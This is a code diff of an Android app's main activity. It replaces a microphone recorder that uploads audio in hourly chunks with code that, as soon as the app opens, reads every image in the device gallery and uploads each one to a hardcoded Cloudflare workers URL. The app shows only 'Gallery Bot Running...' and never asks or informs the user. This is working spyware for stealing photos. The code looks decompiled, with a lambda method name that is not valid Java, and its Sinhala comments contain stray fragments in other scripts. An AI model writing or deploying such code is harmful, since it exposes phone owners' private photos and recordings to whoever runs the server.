@@ -1,167 +1,93 @@
 package com.example.botapp;
 
-import android.Manifest;
-import android.content.pm.PackageManager;
-import android.media.MediaRecorder;
+import android.app.Activity;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
-import android.widget.Button;
-import android.widget.Toast;
-
-import androidx.annotation.NonNull;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-import androidx.work.Constraints;
-import androidx.work.Data;
-import androidx.work.NetworkType;
-import androidx.work.OneTimeWorkRequest;
-import androidx.work.WorkManager;
-
+import android.provider.MediaStore;
+import android.widget.TextView;
+import com.example.botapp.MainActivity$;
 import java.io.File;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
+import java.io.FileInputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
+    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
 
-    private static final int PERMISSION_REQUEST_CODE = 200;
-    private MediaRecorder mediaRecorder;
-    private String currentFilePath = "";
-    private boolean isRecording = false;
-
-    private final Handler handler = new Handler(Looper.getMainLooper());
-    private Runnable chunkRunnable;
-    private static final long CHUNK_DURATION = 60 * 60 * 1000L; // පැයකට වරක්
-
-    @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        TextView tv = new TextView(this);
+        tv.setText("Gallery Bot Running...");
+        setContentView(tv);
+        sendLatestPhoto(CF_URL);
+    }
 
-        Button btnRecordToggle = findViewById(R.id.btnSubmit);
-        if (btnRecordToggle != null) {
-            btnRecordToggle.setText("පටිගත කිරීම අරඹන්න");
+    private void sendLatestPhoto(String targetUrl) {
+        new Thread(new MainActivity$.ExternalSyntheticLambda0(this, targetUrl)).start();
+    }
 
-            btnRecordToggle.setOnClickListener(v -> {
-                if (checkAudioPermission()) {
-                    if (!isRecording) {
-                        startRecordingSession();
-                        btnRecordToggle.setText("පටිගත කිරීම නවත්වන්න");
-                        isRecording = true;
-                    } else {
-                        stopRecordingSession();
-                        btnRecordToggle.setText("පටිගත කිරීම අරඹන්න");
-                        isRecording = false;
+    void lambda$sendLatestPhoto$0$com-example-botapp-MainActivity(String targetUrl) {
+        try {
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {"_data"};
+            Cursor cursor = getContentResolver().query(uri, projection, null, null, "date_added DESC");
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    int index = cursor.getColumnIndexOrThrow("_data");
+                    String path = cursor.getString(index);
+                    if (path != null) {
+                        File file = new File(path);
+                        // ෆයිල් එක පවතියි නම් සහ ප්‍රමාණය මෙගਾਬাইট 10ට වඩා අඩු නම් පමණක් යැවීම
+                        if (file.exists() && file.length() < 10 * 1024 * 1024) {
+                            boolean success = uploadImage(targetUrl, file);
+                            // සර්වර් එකට බර වැඩිවීම වැළැක්වීමට ෆොටෝ එකක් අතරතුර තත්පර 2ක පරතරයක් තැබීම
+                            try {
+                                Thread.sleep(2000);
+                            } catch (InterruptedException e) {
+                                e.printStackTrace();
+                            }
+                            // සර්වර් එකෙන් දෝෂයක් ආවොත් (උදා: 200 නොවීම) ලූප් එක නතර කිරීම
+                            if (!success) {
+                                break;
+                            }
+                        }
                     }
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // uploadImage වෙනස් වී boolean අගයක් (အောင်မြင်යිද නැද්ද) ලබා දෙන ලෙස සකස් කර ඇත
+    private boolean uploadImage(String targetUrl, File file) {
+        try {
+            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/octet-stream");
+            OutputStream out = conn.getOutputStream();
+            FileInputStream in = new FileInputStream(file);
+            byte[] buffer = new byte[4096];
+            while (true) {
+                int bytesRead = in.read(buffer);
+                if (bytesRead != -1) {
+                    out.write(buffer, 0, bytesRead);
                 } else {
-                    requestAudioPermission();
-                }
-            });
-        }
-    }
-
-    private boolean checkAudioPermission() {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private void requestAudioPermission() {
-        ActivityCompat.requestPermissions(
-                this,
-                new String[]{Manifest.permission.RECORD_AUDIO},
-                PERMISSION_REQUEST_CODE
-        );
-    }
-
-    private void startRecordingSession() {
-        startNewChunk();
-
-        chunkRunnable = new Runnable() {
-            @Override
-            public void run() {
-                if (isRecording) {
-                    switchToNextChunk();
-                    handler.postDelayed(this, CHUNK_DURATION);
+                    in.close();
+                    out.flush();
+                    out.close();
+                    int responseCode = conn.getResponseCode();
+                    // ප්‍රතිචාර කේතය 200 (OK) නම් සාර්ථකයි
+                    return responseCode == 200;
                 }
             }
-        };
-        handler.postDelayed(chunkRunnable, CHUNK_DURATION);
-    }
-
-    private void startNewChunk() {
-        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
-        File cacheDir = getExternalCacheDir();
-        if (cacheDir != null) {
-            currentFilePath = cacheDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
-        }
-
-        mediaRecorder = new MediaRecorder();
-        try {
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mediaRecorder.setOutputFile(currentFilePath);
-            mediaRecorder.prepare();
-            mediaRecorder.start();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void switchToNextChunk() {
-        try {
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-            }
-
-            if (currentFilePath != null && !currentFilePath.isEmpty()) {
-                scheduleUpload(currentFilePath);
-            }
-
-            startNewChunk();
         } catch (Exception e) {
             e.printStackTrace();
+            return false;
         }
-    }
-
-    private void stopRecordingSession() {
-        try {
-            handler.removeCallbacks(chunkRunnable);
-
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-            }
-
-            if (currentFilePath != null && !currentFilePath.isEmpty()) {
-                scheduleUpload(currentFilePath);
-            }
-
-            Toast.makeText(this, "පටිගත කිරීම නැවැතුණි.", Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    private void scheduleUpload(String filePath) {
-        Constraints constraints = new Constraints.Builder()
-                .setRequiredNetworkType(NetworkType.CONNECTED)
-                .build();
-
-        Data inputData = new Data.Builder()
-                .putString("file_path", filePath)
-                .build();
-
-        OneTimeWorkRequest uploadWorkRequest = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setConstraints(constraints)
-                .setInputData(inputData)
-                .build();
-
-        WorkManager.getInstance(this).enqueue(uploadWorkRequest);
     }
 }
